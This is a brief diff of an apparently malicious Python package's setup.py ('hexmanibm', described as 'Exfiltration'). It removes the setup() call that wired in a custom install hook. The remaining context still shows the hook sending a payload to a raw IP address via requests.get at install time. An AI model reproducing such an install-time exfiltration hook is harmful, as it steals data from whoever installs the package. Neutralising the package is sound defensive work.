@@ -15,10 +15,4 @@ class CustomInstall(install):
         requests.get("http://9.30.214.68",params = ploads)
 
 
-setup(name='hexmanibm',
-      version='1.0.4',
-      description='Exfiltration',
-      author='hari',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                       
